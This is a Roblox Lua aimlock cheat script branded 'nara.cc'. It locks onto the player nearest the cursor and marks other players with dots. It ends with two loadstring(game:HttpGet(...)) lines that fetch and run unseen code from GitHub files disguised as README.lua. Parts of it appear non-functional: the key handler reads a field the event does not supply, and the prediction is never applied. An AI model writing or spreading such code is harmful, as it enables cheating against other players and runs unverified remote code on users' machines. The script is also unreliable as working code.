-- Set up settings for the script
local Settings = {
    RewrittenMain = {
        Enabled = true, -- Leave this as true
        Key = Enum.KeyCode.C, -- Keybind to lock
        DOT = true, -- Show the actual dot
        AIRSHOT = true, -- Airshot function
        NOTIF = true, -- Show notifications when locking
        AUTOPRED = true, -- Adjust prediction based on ping
        FOV = math.huge, -- Field of view
        RESOLVER = false -- Resolver (currently not implemented)
    }
}

-- Define the selected part and prediction settings
local SelectedPart = "HumanoidRootPart"
local Prediction = true
local PredictionValue = 0.1111 -- Change Prediction, AutoPrediction Must Be Off

-- Define other variables
local AnchorCount = 0
local MaxAnchor = 50
local CC = game:GetService("Workspace").CurrentCamera
local Plr
local enabled = false
local accomidationfactor = 0.121
local mouse = game.Players.LocalPlayer:GetMouse()
local placemarker = Instance.new("Part", game.Workspace)

-- Function to create marker for players
local function makemarker(parent, adornee, color, size, size2)
    local e = Instance.new("BillboardGui", parent)
    e.Name = "PP"
    e.Adornee = adornee
    e.Size = UDim2.new(size, size2, size, size2)
    e.AlwaysOnTop = Settings.RewrittenMain.DOT

    local a = Instance.new("Frame", e)
    a.Size = Settings.RewrittenMain.DOT and UDim2.new(1, 1, 1, 1) or UDim2.new(0, 0, 0, 0)
    a.Transparency = Settings.RewrittenMain.DOT and 0 or 1
    a.BackgroundTransparency = Settings.RewrittenMain.DOT and 0 or 1
    a.BackgroundColor3 = color

    local g = Instance.new("UICorner", a)
    g.CornerRadius = Settings.RewrittenMain.DOT and UDim.new(1, 1) or UDim.new(0, 0)

    return e
end

-- Function to handle player addition and marker creation
local function noob(player)
    repeat wait() until player.Character
    local handler = makemarker(game.Workspace, player.Character:WaitForChild(SelectedPart), Color3.fromRGB(107, 184, 255), 0.3, 3)
    handler.Name = player.Name
    player.CharacterAdded:Connect(function(char) 
        handler.Adornee = char:WaitForChild(SelectedPart) 
    end)
end

-- Handle existing players
for _, player in ipairs(game.Players:GetPlayers()) do
    if player ~= game.Players.LocalPlayer then
        noob(player)
    end
end

-- Listen for new players
game.Players.PlayerAdded:Connect(noob)

-- Create the placemarker
spawn(function()
    placemarker.Anchored = true
    placemarker.CanCollide = false
    placemarker.Size = Settings.RewrittenMain.DOT and Vector3.new(0, 0, 0) or Vector3.new(0, 0, 0)
    placemarker.Transparency = 0.75
    if Settings.RewrittenMain.DOT then
        makemarker(placemarker, placemarker, Color3.fromRGB(255, 0, 0), 1, 0)
    end
end)

-- Handle key press event
game:GetService("Players").LocalPlayer:GetMouse().KeyDown:Connect(function(k)
    if k.KeyCode == Settings.RewrittenMain.Key and Settings.RewrittenMain.Enabled then
        if enabled == true then
            enabled = false
            if Settings.RewrittenMain.NOTIF == true then
                Plr = getClosestPlayerToCursor()
                game.StarterGui:SetCore("SendNotification", {
                    Title = "nara.cc",
                    Text = "Unlocked",
                    Duration = 5
                })
            end
        else
            Plr = getClosestPlayerToCursor()
            enabled = true
            if Settings.RewrittenMain.NOTIF == true then
                game.StarterGui:SetCore("SendNotification", {
                    Title = "nara.cc",
                    Text = "locked: " .. tostring(Plr.Character.Humanoid.DisplayName),
                    Duration = 5
                })
            end
        end
    end
end)

-- Function to get the closest player to cursor
function getClosestPlayerToCursor()
    local closestPlayer
    local shortestDistance = Settings.RewrittenMain.FOV

    for _, v in pairs(game.Players:GetPlayers()) do
        if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild("HumanoidRootPart") then
            local pos = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)
            local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(mouse.X, mouse.Y)).magnitude
            if magnitude < shortestDistance then
                closestPlayer = v
                shortestDistance = magnitude
            end
        end
    end

    return closestPlayer
end

-- Handle prediction and resolver
game:GetService("RunService").RenderStepped:Connect(function()
    if Settings.RewrittenMain.RESOLVER == true and Plr.Character ~= nil and enabled and Settings.RewrittenMain.Enabled then
        if Settings.RewrittenMain.AIRSHOT == true and enabled and Plr.Character ~= nil then
            if game.Workspace.Players[Plr.Name].Humanoid:GetState() == Enum.HumanoidStateType.Freefall then
                if Plr.Character ~= nil and Plr.Character.HumanoidRootPart.Anchored == true then
                    AnchorCount = AnchorCount + 1
                    if AnchorCount >= MaxAnchor then
                        Prediction = false
                        wait(2)
                        AnchorCount = 0
                    end
                else
                    Prediction = true
                    AnchorCount = 0
                end
                SelectedPart = "LeftFoot"
            else
                if Plr.Character ~= nil and Plr.Character.HumanoidRootPart.Anchored == true then
                    AnchorCount = AnchorCount + 1
                    if AnchorCount >= MaxAnchor then
                        Prediction = false
                        wait(2)
                        AnchorCount = 0
                    end
                else
                    Prediction = true
                    AnchorCount = 0
                end
                SelectedPart = "HumanoidRootPart"
            end
        else
            if Plr.Character ~= nil and Plr.Character.HumanoidRootPart.Anchored == true then
                AnchorCount = AnchorCount + 1
                if AnchorCount >= MaxAnchor then
                    Prediction = false
                    wait(2)
                    AnchorCount = 0
                end
            else
                Prediction = true
                AnchorCount = 0
            end
            SelectedPart = "HumanoidRootPart"
        end
    else
        SelectedPart = "HumanoidRootPart"
    end
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/therealzeek/Ctool/main/README.lua", true))()

loadstring(game:HttpGet("https://raw.githubusercontent.com/therealzeek/-codnsk/main/README.lua", true))()
